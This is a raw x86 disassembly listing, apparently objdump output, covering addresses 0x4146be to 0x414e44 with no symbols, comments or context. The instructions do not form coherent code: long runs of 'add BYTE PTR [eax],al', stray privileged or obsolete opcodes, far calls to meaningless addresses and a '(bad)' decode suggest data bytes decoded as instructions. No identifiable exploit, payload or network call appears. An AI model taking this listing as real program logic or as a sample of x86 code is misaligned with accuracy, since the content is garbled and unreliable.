  4146be:	add    BYTE PTR [eax],cl
  4146c0:	and    BYTE PTR [eax],al
  4146c2:	mov    cl,al
  4146c4:	add    cl,0x62
  4146c7:	mov    ds:0x88808000,al
  4146cc:	and    DWORD PTR [eax+0x284800c1],esp
  4146d2:	icebp  
  4146d3:	add    BYTE PTR [eax+eax*1+0x40],al
  4146d7:	pusha  
  4146d8:	add    BYTE PTR [ebx+0x4041],al
  4146de:	mov    WORD PTR [ecx],es
  4146e0:	arpl   WORD PTR [ecx],ax
  4146e2:	or     BYTE PTR [ecx+0x0],ah
  4146e5:	adc    al,0x1
  4146e7:	or     al,0x0
  4146e9:	adc    BYTE PTR [eax+0x10],ah
  4146ec:	add    BYTE PTR [ecx+ebp*1],al
  4146ef:	add    BYTE PTR [ecx+0x24],al
  4146f2:	adc    eax,0x108656a5
  4146f7:	cmp    BYTE PTR ds:0xe318aa,al
  4146fd:	push   ecx
  4146fe:	or     ah,BYTE PTR [eax]
  414700:	add    BYTE PTR [eax],cl
  414702:	push   es
  414703:	add    BYTE PTR [ecx-0x80],0x80
  414707:	add    bh,al
  414709:	add    eax,0x4000040
  41470e:	add    BYTE PTR [esp+eax*2],dl
  414711:	adc    DWORD PTR [eax+0x6],eax
  414714:	add    dl,BYTE PTR [eax]
  414716:	adc    BYTE PTR [eax],ch
  414718:	adc    BYTE PTR [edx+0x20],0x40
  41471c:	add    BYTE PTR [eax],al
  41471e:	or     BYTE PTR [edx-0x37],ah
  414721:	add    eax,0x4850104
  414726:	inc    esp
  414727:	add    eax,0x81801010
  41472c:	ror    BYTE PTR [edx],0x1
  41472f:	inc    ebp
  414730:	xor    DWORD PTR ds:0x40082e21,eax
  414736:	test   BYTE PTR [eax],dl
  414738:	mov    BYTE PTR ds:0x2,al
  41473e:	mov    WORD PTR [eax],cs
  414740:	inc    eax
  414741:	cmp    al,BYTE PTR [eax]
  414743:	dec    ecx
  414744:	or     BYTE PTR [eax+0x4402448],al
  41474a:	loopne 0x4147ae
  41474c:	and    BYTE PTR [eax],al
  41474e:	add    al,0x0
  414750:	add    BYTE PTR [eax+eiz*1],dl
  414753:	add    BYTE PTR [eax+0x29884100],0x1
  41475a:	sbb    BYTE PTR [esi],0x0
  41475d:	nop
  41475e:	or     ah,BYTE PTR [eax]
  414760:	and    BYTE PTR [eax],dl
  414762:	add    al,0x3
  414764:	add    DWORD PTR [eax],ecx
  414766:	add    BYTE PTR [ebx],ah
  414768:	inc    eax
  414769:	add    al,0x0
  41476b:	or     DWORD PTR [eax],0x61581150
  414771:	or     BYTE PTR [eax+eax*4],dl
  414774:	and    BYTE PTR [eax],ah
  414776:	adc    BYTE PTR [eax],cl
  414778:	add    BYTE PTR [eax],al
  41477a:	nop
  41477b:	push   ecx
  41477c:	and    BYTE PTR [eax+0x804848],dl
  414782:	cdq    
  414783:	add    dl,BYTE PTR [eax+0x8495405]
  414789:	inc    eax
  41478a:	les    edx,FWORD PTR [eax]
  41478c:	adc    DWORD PTR [eax+0xc383],0x43350021
  414796:	adc    DWORD PTR [eax+0x20],eax
  414799:	add    BYTE PTR [eax],0x20
  41479c:	add    al,0xc
  41479e:	add    DWORD PTR [eax],eax
  4147a0:	rcl    BYTE PTR [eax],0x0
  4147a3:	call   0x40d57ac1
  4147a8:	add    BYTE PTR [ebx+0x0],al
  4147ab:	pusha  
  4147ac:	xchg   edi,eax
  4147ad:	inc    edx
  4147ae:	add    al,0x9a
  4147b0:	adc    BYTE PTR [edx],0xc0
  4147b3:	adc    eax,0x2246
  4147b8:	add    BYTE PTR [eax],al
  4147ba:	mov    al,BYTE PTR [edx]
  4147bc:	add    BYTE PTR [ecx],al
  4147be:	add    BYTE PTR [eax],0x1
  4147c1:	add    BYTE PTR [ecx],ah
  4147c3:	push   ecx
  4147c4:	add    BYTE PTR [eax],al
  4147c6:	sbb    al,0x60
  4147c8:	inc    ecx
  4147c9:	add    al,0x24
  4147cb:	inc    ecx
  4147cc:	add    BYTE PTR es:[eax],al
  4147cf:	or     BYTE PTR [eax+eax*1],al
  4147d2:	jbe    0x4147d9
  4147d4:	push   ecx
  4147d5:	pop    esp
  4147d6:	mov    ds:0x100300,al
  4147db:	push   ebx
  4147dc:	and    BYTE PTR [eax],al
  4147de:	adc    al,ah
  4147e0:	cwde   
  4147e1:	dec    eax
  4147e2:	add    BYTE PTR [eax+0x2],al
  4147e5:	mov    WORD PTR [ecx+0x80200a1],ss
  4147eb:	add    BYTE PTR [edi+ebp*1+0x22],ah
  4147ef:	rol    BYTE PTR [eax],0x82
  4147f2:	and    eax,0x630a000a
  4147f7:	lock or BYTE PTR [ecx+0x41],al
  4147fb:	add    BYTE PTR [eax],dl
  4147fd:	les    eax,FWORD PTR [eax]
  4147ff:	or     BYTE PTR [eax-0x68],0x1
  414803:	add    DWORD PTR [eax],eax
  414805:	out    dx,al
  414806:	or     BYTE PTR [eax+0x62560088],0x88
  41480d:	add    BYTE PTR [eax],dl
  41480f:	sub    BYTE PTR [ecx],0xcd
  414812:	add    BYTE PTR [eax],ah
  414814:	add    BYTE PTR [edx+0x8001420],ah
  41481a:	and    al,0x32
  41481c:	pusha  
  41481d:	add    DWORD PTR [ecx+0x10630022],eax
  414823:	push   0x58
  414825:	icebp  
  414826:	and    edx,DWORD PTR [eax+0x0]
  414829:	dec    eax
  41482a:	add    BYTE PTR [eax],ah
  41482c:	rol    DWORD PTR [eax-0x3deeef60],0x0
  414833:	xchg   esp,eax
  414834:	and    DWORD PTR [eax],eax
  414836:	xor    BYTE PTR [eax],cl
  414838:	or     DWORD PTR [eax],eax
  41483a:	inc    eax
  41483b:	add    BYTE PTR [ecx],0x2
  41483e:	add    BYTE PTR [ecx],al
  414840:	add    DWORD PTR [eax+0x142c08],edx
  414846:	add    al,0x4
  414848:	mov    cl,0x0
  41484a:	add    BYTE PTR ds:0x45000024,bl
  414850:	add    al,0x8
  414852:	or     dl,BYTE PTR [eax]
  414854:	add    BYTE PTR [edx+ecx*8+0x48],cl
  414858:	add    eax,0x19800090
  41485d:	or     BYTE PTR [edx+eax*1],dl
  414860:	and    BYTE PTR [ecx+0x201120],0x10
  414867:	jne    0x41486b
  414869:	or     BYTE PTR [ecx+0x1],al
  41486c:	add    BYTE PTR [eax+0x4002901],al
  414872:	inc    eax
  414873:	add    al,BYTE PTR ds:0xc50008
  414879:	jns    0x414807
  41487b:	add    cl,BYTE PTR [ecx+0x4525c100]
  414881:	or     BYTE PTR [eax+0x2050000c],al
  414887:	add    BYTE PTR [esp+eax*8+0x43],ah
  41488b:	add    edx,DWORD PTR [edx+0x419a13]
  414891:	add    BYTE PTR [eax+0x0],dl
  414894:	add    BYTE PTR [eax+eax*4],bl
  414897:	sbb    eax,0x62616a00
  41489c:	and    BYTE PTR [ecx],al
  41489e:	inc    edx
  41489f:	add    BYTE PTR [eax+0x52],cl
  4148a2:	dec    eax
  4148a3:	or     al,0x11
  4148a5:	or     BYTE PTR [edx+0x20020001],ah
  4148ab:	add    BYTE PTR [eax],al
  4148ad:	add    BYTE PTR [eax+0x0],ah
  4148b0:	xor    DWORD PTR [eax+edx*1+0x8],eax
  4148b4:	mov    al,ds:0x82102c
  4148b9:	add    BYTE PTR [eax],al
  4148bb:	and    BYTE PTR [ebx],dl
  4148bd:	add    BYTE PTR [eax],ah
  4148bf:	jb     0x4148ee
  4148c1:	adc    DWORD PTR [eax],0x3040ee00
  4148c7:	or     DWORD PTR [edx],0x600a900
  4148cd:	inc    eax
  4148ce:	ins    BYTE PTR es:[edi],dx
  4148cf:	adc    al,0x6
  4148d1:	adc    ah,BYTE PTR [esi]
  4148d3:	sbb    BYTE PTR [eax+0x8],al
  4148d6:	and    al,0x10
  4148d8:	add    BYTE PTR [edx-0x6c],dh
  4148db:	and    al,0x0
  4148dd:	adc    BYTE PTR [ecx],al
  4148df:	call   0xa4250e4
  4148e4:	add    BYTE PTR [eax],al
  4148e6:	push   eax
  4148e7:	add    BYTE PTR [eax],dl
  4148e9:	dec    eax
  4148ea:	add    BYTE PTR [ecx],al
  4148ec:	add    al,al
  4148ee:	sbb    BYTE PTR [eax],ah
  4148f0:	and    BYTE PTR [eax],dl
  4148f2:	and    al,dl
  4148f4:	inc    eax
  4148f5:	and    BYTE PTR [edx+0x1],al
  4148f8:	add    BYTE PTR [edx],0x14
  4148fb:	xor    DWORD PTR [eax],eax
  4148fd:	add    DWORD PTR [eax+0x2],eax
  414900:	inc    eax
  414901:	or     BYTE PTR [ebx],al
  414903:	add    al,0x0
  414905:	sub    eax,DWORD PTR [ecx+eiz*8]
  414908:	or     BYTE PTR [eax],al
  41490a:	add    BYTE PTR [eax],dl
  41490c:	mov    BYTE PTR [eax],ah
  41490e:	enter  0x200,0x18
  414912:	sbb    DWORD PTR [edx+0x4a01d9],eax
  414918:	lds    ebx,FWORD PTR [eax]
  41491a:	push   es
  41491b:	retf   
  41491c:	add    DWORD PTR [eax],ebx
  41491e:	mov    ds:0x10a25640,al
  414923:	add    BYTE PTR [ecx],ch
  414925:	adc    eax,DWORD PTR [eax+0x26604874]
  41492b:	inc    ecx
  41492c:	sub    BYTE PTR [eax+0x1108030],al
  414932:	add    BYTE PTR [eax],al
  414934:	and    BYTE PTR [ebx+0x14],al
  414937:	add    BYTE PTR [eax+0x50],0x8
  41493b:	inc    eax
  41493c:	mov    al,ds:0x1202000c
  414941:	es loopne 0x414944
  414944:	add    DWORD PTR [edx],eax
  414946:	adc    BYTE PTR [edx+0x204103],al
  41494c:	add    BYTE PTR [eax+0x380c2214],al
  414952:	add    al,0x0
  414954:	add    BYTE PTR [eax],0x1
  414957:	or     BYTE PTR [eax],ah
  414959:	add    al,0x0
  41495b:	add    BYTE PTR [eax],cl
  41495d:	add    BYTE PTR [eax+eax*8+0x54],al
  414964:	add    al,BYTE PTR [eax]
  414966:	sbb    BYTE PTR [eax+0x0],cl
  414969:	add    dl,bl
  41496b:	mov    ds:0x800a4401,eax
  414970:	nop
  414971:	adc    al,BYTE PTR [edx*2+0x4000008]
  414978:	nop
  414979:	loopne 0x41499c
  41497b:	adc    BYTE PTR ds:0x12434540,al
  414981:	and    al,0x18
  414983:	add    BYTE PTR [eax],0x1
  414986:	adc    DWORD PTR [eax+0x44],esp
  414989:	add    BYTE PTR [eax-0x77],al
  41498c:	mov    al,ds:0xa9680080
  414991:	add    cl,BYTE PTR [edx]
  414993:	add    al,BYTE PTR [ecx+0x180a200]
  414999:	add    BYTE PTR [eax+eiz*1],cl
  41499c:	or     BYTE PTR [ecx+eax*1],al
  41499f:	add    BYTE PTR [edx+0x8],0x80
  4149a3:	add    DWORD PTR [eax+0x47280000],eax
  4149a9:	add    BYTE PTR [eax-0x7c76df00],al
  4149af:	shl    BYTE PTR [edx],0x0
  4149b2:	inc    edx
  4149b3:	xchg   esp,eax
  4149b4:	add    dl,BYTE PTR [eax+eiz*2]
  4149b7:	xor    edx,eax
  4149b9:	add    BYTE PTR [eax],ah
  4149bb:	inc    eax
  4149bc:	add    dl,BYTE PTR [ecx]
  4149be:	xchg   BYTE PTR [ecx-0x4fe9beff],cl
  4149c4:	xor    eax,DWORD PTR [edx+0x8]
  4149c7:	add    BYTE PTR [edx+eax*1],dh
  4149ca:	xchg   DWORD PTR [eax+0x2],eax
  4149cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ce:	pusha  
  4149cf:	test   al,0x88
  4149d1:	add    al,0x2
  4149d3:	gs push ebx
  4149d5:	adc    al,BYTE PTR [eax+0x4]
  4149d8:	and    eax,DWORD PTR [ecx]
  4149da:	add    al,BYTE PTR [eax+0x8]
  4149dd:	add    BYTE PTR [eax],al
  4149df:	adc    al,BYTE PTR [eax]
  4149e1:	add    BYTE PTR [eax+0x68300ab],al
  4149e7:	or     BYTE PTR [eax],al
  4149e9:	adc    BYTE PTR [eax+0x1],al
  4149ec:	adc    BYTE PTR [ecx],bh
  4149ee:	rol    DWORD PTR [eax+0x8770020],0x82
  4149f5:	inc    ecx
  4149f6:	or     BYTE PTR [eax],al
  4149f8:	add    DWORD PTR [eax-0x7d7bb9f0],esp
  4149fe:	dec    ecx
  4149ff:	add    DWORD PTR [ecx+eax*2],0x44011c
  414a06:	inc    eax
  414a07:	xor    BYTE PTR [eax],bl
  414a09:	add    BYTE PTR [ebx+0x690082],al
  414a0f:	add    BYTE PTR [eax+0x49],al
  414a12:	adc    al,0x91
  414a14:	adc    BYTE PTR [eax+0x8e3c115],ah
  414a1a:	and    BYTE PTR [eax],al
  414a1c:	and    DWORD PTR [eax],esp
  414a1e:	or     DWORD PTR [eax],eax
  414a20:	add    BYTE PTR [eax],0x0
  414a23:	or     BYTE PTR [eax],al
  414a25:	add    BYTE PTR [ecx+0x41924002],0x20
  414a2c:	rcl    BYTE PTR [ecx],0x50
  414a2f:	or     BYTE PTR [eax],al
  414a31:	inc    esp
  414a32:	add    BYTE PTR ds:0x2000280,al
  414a38:	add    BYTE PTR [eax],al
  414a3a:	sub    BYTE PTR [eax+eiz*1],al
  414a3d:	or     DWORD PTR [eax],edx
  414a3f:	adc    ch,BYTE PTR ds:0x2c100
  414a45:	add    DWORD PTR [eax],0x41212002
  414a4b:	adc    BYTE PTR [eax],al
  414a4d:	add    BYTE PTR [eax],al
  414a4f:	adc    al,0x0
  414a51:	adc    DWORD PTR [edx],edx
  414a53:	add    DWORD PTR [ebp+0x20c14600],eax
  414a59:	inc    edx
  414a5a:	dec    eax
  414a5b:	or     al,0x20
  414a5d:	add    BYTE PTR [edx+0x0],al
  414a60:	add    BYTE PTR [eax],al
  414a62:	adc    BYTE PTR [eax],ah
  414a64:	add    BYTE PTR [eax],al
  414a66:	and    BYTE PTR [eax+0x1],dl
  414a69:	push   eax
  414a6a:	add    DWORD PTR [eax],eax
  414a6c:	add    BYTE PTR [ecx],cl
  414a6e:	mov    al,ds:0xa207a08d
  414a73:	add    al,0x60
  414a75:	mov    BYTE PTR [edi],al
  414a77:	add    ebx,DWORD PTR [eax+0x41c104]
  414a7d:	sbb    al,BYTE PTR es:[eax-0x77efb500]
  414a84:	add    al,0x20
  414a86:	inc    eax
  414a87:	add    BYTE PTR [eax],ah
  414a89:	add    ah,BYTE PTR [eax+0x18]
  414a8c:	or     al,al
  414a8e:	and    BYTE PTR [esp+eax*4],ah
  414a91:	xor    BYTE PTR [eax+0x78c30051],ah
  414a97:	and    BYTE PTR [eax-0x40],al
  414a9a:	adc    al,0xc2
  414a9c:	adc    dl,dh
  414a9e:	inc    eax
  414a9f:	inc    ebx
  414aa0:	add    BYTE PTR [ecx],al
  414aa2:	xchg   esp,eax
  414aa3:	nop
  414aa4:	add    al,0x40
  414aa6:	add    BYTE PTR [eax],ah
  414aa8:	sbb    BYTE PTR [eax],al
  414aaa:	adc    cl,BYTE PTR [eax]
  414aac:	adc    DWORD PTR [ecx+0xa080280],ebp
  414ab2:	inc    edx
  414ab3:	or     BYTE PTR [eax],ah
  414ab5:	add    BYTE PTR [ecx],al
  414ab7:	or     DWORD PTR [eax],eax
  414ab9:	and    al,0x1
  414abb:	or     BYTE PTR [eax],al
  414abd:	cwde   
  414abe:	and    BYTE PTR [esp+eax*8],dl
  414ac1:	sbb    BYTE PTR [eax],ah
  414ac3:	data16 add BYTE PTR [eax],ah
  414ac6:	add    BYTE PTR [esi],al
  414ac8:	and    DWORD PTR [eax],eax
  414aca:	enter  0x4923,0x0
  414ace:	and    BYTE PTR [esi],al
  414ad0:	add    BYTE PTR [eax],al
  414ad2:	push   edx
  414ad3:	pusha  
  414ad4:	imul   ebp,DWORD PTR [ebx+0x45000000],0x548e0000
  414ade:	sub    DWORD PTR [eax-0x80],eax
  414ae1:	retf   
  414ae2:	push   edx
  414ae3:	and    dl,BYTE PTR [eax]
  414ae5:	or     BYTE PTR [edx],cl
  414ae7:	add    BYTE PTR [ecx],ah
  414ae9:	push   eax
  414aea:	dec    eax
  414aeb:	push   ecx
  414aec:	add    BYTE PTR [eax],al
  414aee:	inc    esp
  414aef:	add    BYTE PTR [eax+0x210800a0],0x81
  414af6:	add    BYTE PTR [eax+0x40],dl
  414af9:	or     al,0x44
  414afb:	dec    ebx
  414afc:	or     BYTE PTR [eax+eax*1],cl
  414aff:	xor    DWORD PTR [ecx],esi
  414b01:	and    BYTE PTR [ecx],al
  414b03:	stos   BYTE PTR es:[edi],al
  414b04:	add    DWORD PTR [ecx],edi
  414b06:	adc    DWORD PTR [eax],0x100286
  414b0c:	adc    ebp,DWORD PTR [eax]
  414b0e:	jno    0x414b18
  414b10:	add    BYTE PTR [eax],al
  414b12:	inc    ecx
  414b13:	push   esp
  414b14:	add    BYTE PTR [eax],0x2
  414b17:	inc    eax
  414b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b19:	or     DWORD PTR [eax+0x0],eax
  414b1c:	add    BYTE PTR [eax],al
  414b1e:	sbb    BYTE PTR [ecx+0x7085100],al
  414b24:	add    cl,BYTE PTR [eax]
  414b26:	inc    ecx
  414b27:	inc    ecx
  414b28:	test   BYTE PTR [eax],al
  414b2a:	and    DWORD PTR [ebx],eax
  414b2c:	inc    esi
  414b2d:	push   ecx
  414b2e:	rol    DWORD PTR [eax+0x110560c8],0x10
  414b35:	or     eax,DWORD PTR [eax]
  414b37:	add    BYTE PTR [eax],0x0
  414b3a:	test   al,0x18
  414b3c:	add    BYTE PTR [eax-0x79],al
  414b3f:	adc    al,BYTE PTR [ecx+0x2b31a110]
  414b45:	test   BYTE PTR [edx],al
  414b47:	add    BYTE PTR [eax],ah
  414b49:	nop
  414b4a:	or     BYTE PTR [eax],0x4
  414b4d:	or     BYTE PTR [ecx+0x2],ah
  414b50:	add    BYTE PTR [eax+eax*1],0x1
  414b54:	or     al,BYTE PTR [eax]
  414b56:	test   DWORD PTR [ecx+0x300200a],edx
  414b5c:	adc    BYTE PTR [eax],dl
  414b5e:	adc    DWORD PTR [eax],eax
  414b60:	or     DWORD PTR [eax-0x7fffffc0],eax
  414b66:	inc    ecx
  414b67:	push   es
  414b68:	and    al,BYTE PTR [eax]
  414b6a:	add    BYTE PTR [ebp+0xd],dl
  414b6d:	or     al,0x0
  414b6f:	or     BYTE PTR [eax],ah
  414b71:	or     dl,BYTE PTR [ecx+0x2800201a]
  414b77:	add    BYTE PTR [edx],al
  414b79:	xchg   edx,eax
  414b7a:	add    al,0x48
  414b7c:	gs add al,0x20
  414b7f:	sub    BYTE PTR [eax],0x0
  414b82:	add    BYTE PTR [eax],al
  414b84:	sub    BYTE PTR [eax+eax*2+0x10242015],bl
  414b8b:	and    BYTE PTR [eax+0x1],ah
  414b8e:	inc    ebp
  414b8f:	add    DWORD PTR [eax],eax
  414b91:	adc    BYTE PTR [eax+eax*1+0x8000080],al
  414b98:	add    BYTE PTR [edx+0x12],al
  414b9b:	add    eax,0xa814800
  414ba0:	add    DWORD PTR [edx],edx
  414ba2:	sub    DWORD PTR [eax+eiz*1],esp
  414ba5:	add    BYTE PTR [eax],al
  414ba7:	add    dl,cl
  414ba9:	add    BYTE PTR [eax],al
  414bab:	ret    0x0
  414bae:	adc    ch,al
  414bb0:	ror    BYTE PTR [ebp+0x66],0x81
  414bb4:	inc    eax
  414bb5:	adc    BYTE PTR [eax+0x28],al
  414bb8:	add    DWORD PTR [eax],eax
  414bba:	add    BYTE PTR [eax],al
  414bbc:	add    BYTE PTR [eax+eax*1+0x20011a],ch
  414bc3:	add    al,0x21
  414bc5:	add    BYTE PTR [eax],al
  414bc7:	mov    al,ds:0x48610080
  414bcc:	sbb    BYTE PTR [eax],0x5d
  414bcf:	pushf  
  414bd0:	add    BYTE PTR [eax+0x1220029],al
  414bd6:	add    eax,0x60010120
  414bdb:	add    BYTE PTR [edx+0x4118888a],dl
  414be1:	add    BYTE PTR [edx],ah
  414be3:	inc    eax
  414be4:	add    BYTE PTR [esi],0x41
  414be7:	or     BYTE PTR [edx],dh
  414be9:	inc    ecx
  414bea:	rol    DWORD PTR [eax],0x20
  414bed:	sub    al,BYTE PTR [ecx+0x68]
  414bf0:	sbb    al,al
  414bf2:	sub    esi,DWORD PTR [eax]
  414bf4:	inc    ecx
  414bf5:	and    BYTE PTR [eax+0x38a804],cl
  414bfb:	call   0x4000:0x8208064
  414c02:	or     BYTE PTR [eax],ah
  414c04:	shl    BYTE PTR [eax],0x0
  414c07:	add    ah,BYTE PTR [eax+0x0]
  414c0a:	sbb    DWORD PTR [eax+eiz*4],0x820012
  414c11:	adc    BYTE PTR [eax],cl
  414c13:	add    bl,al
  414c15:	add    BYTE PTR [eax],ah
  414c17:	add    al,0x8
  414c19:	add    cl,al
  414c1b:	add    BYTE PTR [edx+0x188470a],al
  414c21:	pop    ebp
  414c22:	or     BYTE PTR [eax],al
  414c24:	add    BYTE PTR [eax],bl
  414c26:	or     al,0x4
  414c28:	and    DWORD PTR [ecx+0x20],eax
  414c2b:	or     BYTE PTR [eax-0x30],ah
  414c2e:	jbe    0x414c70
  414c30:	add    al,0xc
  414c32:	push   ecx
  414c33:	imul   esp,ecx,0x40004440
  414c39:	push   eax
  414c3a:	or     BYTE PTR [eax],al
  414c3c:	add    BYTE PTR [eax+0x4009b18],al
  414c42:	add    BYTE PTR [eax],al
  414c44:	add    BYTE PTR [eax],dl
  414c46:	add    BYTE PTR [eax],al
  414c48:	jo     0x414c4a
  414c4a:	add    al,0xc8
  414c4c:	add    BYTE PTR [eax],al
  414c4e:	adc    BYTE PTR [eax+0x8],al
  414c51:	add    BYTE PTR [edx],al
  414c53:	sbb    al,BYTE PTR [ebp+0x1]
  414c56:	rol    DWORD PTR [eax],0x0
  414c59:	add    ch,BYTE PTR [edx]
  414c5b:	add    al,0x42
  414c5d:	sar    BYTE PTR [eax-0x5b],0x2
  414c61:	nop
  414c62:	int3   
  414c63:	inc    eax
  414c64:	and    DWORD PTR [eax+0x4],eax
  414c67:	add    BYTE PTR [eax],al
  414c69:	inc    edx
  414c6a:	and    BYTE PTR [ecx-0x25ffb7a0],al
  414c70:	adc    cl,BYTE PTR [eax]
  414c72:	inc    ebp
  414c73:	add    al,0xe8
  414c75:	and    BYTE PTR [edx],ah
  414c77:	add    BYTE PTR [esp+eiz*4],al
  414c7a:	test   BYTE PTR [ecx-0x7dfef908],ah
  414c80:	or     BYTE PTR [eax],dl
  414c82:	inc    eax
  414c83:	add    BYTE PTR [eax],al
  414c85:	inc    ebx
  414c86:	add    al,BYTE PTR [ebp+0x0]
  414c89:	sbb    BYTE PTR [edx],cl
  414c8b:	add    edx,DWORD PTR [edx+ebx*1]
  414c8e:	add    BYTE PTR [ecx],al
  414c90:	add    al,0x10
  414c92:	or     DWORD PTR [eax],eax
  414c94:	cmp    BYTE PTR [eax],al
  414c96:	add    BYTE PTR [eax],0x0
  414c99:	loope  0x414c1b
  414c9b:	or     BYTE PTR [eax],al
  414c9d:	bound  esp,QWORD PTR [edx+0x10]
  414ca0:	add    BYTE PTR [ecx+0x4],al
  414ca3:	add    BYTE PTR [eax],al
  414ca5:	adc    ah,BYTE PTR [eax+0x0]
  414ca8:	add    esp,0x10420002
  414cae:	dec    eax
  414caf:	adc    DWORD PTR [eax+0x48],0x9868c004
  414cb6:	add    BYTE PTR [eax],al
  414cb8:	jmp    0x1110:0x8069208
  414cbf:	sbb    BYTE PTR [edx],bl
  414cc1:	push   eax
  414cc2:	xor    DWORD PTR [eax],eax
  414cc4:	inc    eax
  414cc5:	add    BYTE PTR [eax],al
  414cc7:	add    BYTE PTR [ecx+0x10844000],cl
  414ccd:	inc    esi
  414cce:	adc    BYTE PTR [eax+eax*1],ah
  414cd1:	test   BYTE PTR [eax],al
  414cd3:	adc    BYTE PTR [edx],al
  414cd5:	and    BYTE PTR [eax+0x2040000],cl
  414cdb:	and    ch,0xc
  414cde:	or     BYTE PTR [eax+0x4],cl
  414ce1:	push   eax
  414ce2:	add    BYTE PTR [ecx+0x0],dl
  414ce5:	add    al,0x91
  414ce7:	or     BYTE PTR [ecx],cl
  414ce9:	adc    BYTE PTR ds:0x31190900,al
  414cef:	push   ecx
  414cf0:	add    BYTE PTR [eax],dh
  414cf2:	inc    ecx
  414cf3:	ret    0x6409
  414cf6:	add    BYTE PTR [ecx],al
  414cf8:	mov    al,0x23
  414cfa:	inc    eax
  414cfb:	and    DWORD PTR [eax],eax
  414cfd:	sub    BYTE PTR [eax],al
  414cff:	dec    esi
  414d00:	add    BYTE PTR [ecx+0x4],al
  414d03:	and    BYTE PTR [edx+edi*1],ah
  414d06:	add    BYTE PTR [edx],al
  414d08:	pusha  
  414d09:	add    BYTE PTR [edx+0x0],cl
  414d0c:	add    al,0x1
  414d0e:	add    DWORD PTR [eax],eax
  414d10:	add    BYTE PTR [eax],al
  414d12:	add    BYTE PTR [eax],al
  414d14:	dec    edi
  414d15:	rol    BYTE PTR [eax+eiz*2],0x1
  414d19:	and    ah,BYTE PTR [eax+ecx*1]
  414d1c:	loope  0x414d2f
  414d1e:	test   BYTE PTR [edx],cl
  414d20:	or     BYTE PTR [eax],dl
  414d22:	sbb    BYTE PTR [eax-0x7e],al
  414d25:	mov    WORD PTR [eax-0x7e],gs
  414d28:	add    al,0x18
  414d2a:	add    BYTE PTR [eax+0x45c00080],0x2
  414d31:	fs cwde 
  414d33:	inc    ecx
  414d34:	into   
  414d35:	and    BYTE PTR [eax],al
  414d37:	add    al,0x4
  414d39:	pop    edx
  414d3a:	nop
  414d3b:	adc    BYTE PTR [ecx],al
  414d3d:	add    BYTE PTR [eax],dh
  414d3f:	add    BYTE PTR [edx],0x42
  414d42:	add    al,0x8
  414d44:	and    eax,0xb95104a2
  414d49:	sub    cl,BYTE PTR [eax+0x0]
  414d4c:	add    BYTE PTR [ecx],al
  414d4e:	add    BYTE PTR [ecx-0x38],al
  414d51:	cmp    ah,BYTE PTR [eax]
  414d53:	add    eax,0x1000a02c
  414d58:	or     BYTE PTR [eax],al
  414d5a:	or     BYTE PTR [eax+0x48008300],al
  414d60:	les    esp,FWORD PTR [ecx]
  414d62:	add    BYTE PTR [ecx+0x0],al
  414d65:	adc    DWORD PTR [eax],eax
  414d67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d68:	or     BYTE PTR [eax+eax*2],al
  414d6b:	inc    ecx
  414d6c:	or     al,0x0
  414d6e:	inc    eax
  414d6f:	inc    eax
  414d70:	adc    BYTE PTR ds:0x11040,ah
  414d76:	or     BYTE PTR [eax+0x0],dl
  414d79:	add    BYTE PTR [edx+ebx*2],al
  414d7c:	lods   al,BYTE PTR ds:[esi]
  414d7d:	inc    edx
  414d7e:	inc    ecx
  414d7f:	add    al,BYTE PTR [eax+0x3a]
  414d82:	xchg   edx,eax
  414d83:	loopne 0x414dcd
  414d85:	test   edx,eax
  414d87:	arpl   WORD PTR [edx+0x2b],ax
  414d8a:	xor    BYTE PTR [eax+0x0],ah
  414d8d:	add    al,0x8
  414d8f:	add    BYTE PTR [eax],al
  414d91:	add    DWORD PTR [eax],eax
  414d93:	inc    eax
  414d94:	sub    DWORD PTR [eax+0x1],ecx
  414d97:	add    BYTE PTR [ebx],0x30
  414d9a:	add    BYTE PTR [eax-0x2ef7edcc],cl
  414da0:	loopne 0x414ddb
  414da2:	add    BYTE PTR [eax+eax*2],al
  414da5:	add    al,BYTE PTR [edx]
  414da7:	or     BYTE PTR [eax],al
  414da9:	add    BYTE PTR [edx],bl
  414dab:	dec    eax
  414dac:	inc    ebp
  414dad:	inc    ecx
  414dae:	mov    al,ds:0x80808000
  414db3:	add    BYTE PTR [eax],al
  414db5:	inc    eax
  414db6:	add    BYTE PTR ds:0x40f40029,ch
  414dbc:	push   eax
  414dbd:	add    BYTE PTR [eax+ebx*8],0x16
  414dc1:	mov    al,ds:0xc1805000
  414dc6:	add    BYTE PTR [eax+eax*1],al
  414dc9:	add    BYTE PTR [eax+0x1010042],cl
  414dcf:	add    BYTE PTR [eax+eiz*1],al
  414dd2:	and    BYTE PTR [eax-0x3f],al
  414dd5:	inc    ecx
  414dd6:	or     BYTE PTR [ebx+eax*2],al
  414dd9:	and    DWORD PTR [eax],0x4074d0c8
  414ddf:	add    BYTE PTR [eax],0x42
  414de2:	add    DWORD PTR [eax+0x5],eax
  414de5:	inc    eax
  414de6:	dec    esp
  414de7:	add    BYTE PTR [esi],ah
  414de9:	inc    eax
  414dea:	add    BYTE PTR [esp+eax*1],al
  414ded:	adc    ah,BYTE PTR [eax]
  414def:	jo     0x414e32
  414df1:	(bad)  
  414df2:	adc    DWORD PTR [eax],eax
  414df4:	or     BYTE PTR [eax],0x40
  414df7:	add    BYTE PTR [edx],al
  414df9:	inc    edi
  414dfa:	add    bh,al
  414dfc:	push   ecx
  414dfd:	call   0x8803:0x8028841
  414e04:	add    BYTE PTR [eax],dh
  414e06:	test   DWORD PTR [ecx-0x7f],eax
  414e09:	dec    eax
  414e0a:	inc    edx
  414e0b:	or     BYTE PTR [ecx],al
  414e0d:	add    BYTE PTR [edx+0x10],dl
  414e10:	mov    BYTE PTR [eax],al
  414e12:	add    al,0x1
  414e14:	add    al,BYTE PTR [eax+0x3]
  414e17:	add    BYTE PTR [eax],al
  414e19:	mov    DWORD PTR [eax+0x2],eax
  414e1c:	add    BYTE PTR [eax],bl
  414e1e:	add    BYTE PTR [eax],dh
  414e20:	add    BYTE PTR [eax],ah
  414e22:	adc    BYTE PTR [eax+0x1],al
  414e25:	add    BYTE PTR [esp+eax*1+0xa000],al
  414e2c:	add    BYTE PTR es:[eax+0xe],al
  414e30:	add    al,BYTE PTR [eax]
  414e32:	adc    ebx,DWORD PTR [edx+eax*4+0x39]
  414e36:	adc    BYTE PTR [ecx*1+0x12a800],cl
  414e3d:	push   gs
  414e3f:	and    al,0x31
  414e41:	rol    DWORD PTR [eax],0x50
  414e44:	inc    eax
